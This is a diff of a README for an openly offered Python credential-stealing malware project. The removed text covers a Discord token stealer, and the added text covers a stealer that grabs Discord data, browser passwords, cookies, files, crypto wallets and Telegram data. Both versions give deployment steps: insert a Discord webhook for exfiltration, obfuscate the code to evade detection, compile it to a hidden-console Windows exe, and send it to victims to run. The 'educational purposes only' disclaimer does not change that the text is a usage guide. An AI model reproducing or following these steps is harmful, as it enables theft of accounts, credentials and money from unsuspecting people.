@@ -1,32 +1,65 @@
-<h1 align="center">Discord Token Stealer</h1>
-<p align="center">A Discord token stealer app written in Python 3.</p>
+<h1>Stealer</h1> 
+<p align="center"> 
+  <kbd>
+<img src="https://cdn.discordapp.com/attachments/1042447445839327233/1042481482695983104/1fa9fcfd25964998568f0c4215a363f0.jpg" width="400"></img>
+  </kbd>
+</p>
 
-<p align="center">This version of the grabber only supports <b>Windows</b>.</p>
+<p> if you got error add me Maybach-#1337 </p>
+<p> discord.gg/ZFvAgzn6BR for more info </p>
 
-# Features
- - No local caching
- - Transfers via Discord webhook
- - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google Chrome, Firefox, Opera, Microsoft Edge, Brave, Yandex and Vivaldi)
- - No external Python modules required
 
-<br>
 
-# How to use
- 1. Create a webhook on your Discord server. I recommend you to create a new server.
- 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_stealer.py](token_stealer.py)
- 3. *(obfuscate the code or install it as a backdoor in an other script.)*
- 4. Send the script to your victim and make them run it.
+## Features:
+» Grabs Discord Information and HQ Friends.
 
-<br>
+» Grabs Password & cookies.
 
-# Author
-- **cankat**
-    - [Github](https://github.com/cankatx)
-    - [Discord](https://discord.gg/fsgu7EnTyp)
+» Grabs Files.
 
-# Disclaimer
-- All responsibilities are at your own risk.
-- This app developed for educational purposes only.
+» Shows Crypto Wallets
 
-# Credit
-Used both of the [wodx's](https://github.com/wodxgod) code.
+» Grabs metamask/exodus
+
+» Grabs Telegram
+
+» Grabs chromium based Passwords
+
+
+## Setup:
+ 
+First paste and save your webhook address instead of `"WEBHOOK HERE"` in main.py
+
+If you use obfuscator it will be undetectable.
+
+Now You need to use pyinstaller to convert python file to exe.
+
+Open CMD and type `pip install auto_py_to_exe`
+
+And after installed `python -m auto_py_to_exe`
+
+Browse file Select `One file and Windows Based (hide the console)`
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Maybach1337/Satan-Stealer/main/img/pyy (1).png "></img>
+
+And press covert .py .exe
+
+ <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+
+## Pictures:
+ 
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Maybach1337/Satan-Stealer/main/img/ssatan0.jpg"></img>
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Maybach1337/Satan-Stealer/main/img/ssatan1.jpg"></img>
+
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Maybach1337/Satan-Stealer/main/img/ssatan2.jpg"></img>
+ 
+ 
+## Disclaimer:
+
+This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>
+
+## License:
+By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
+
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
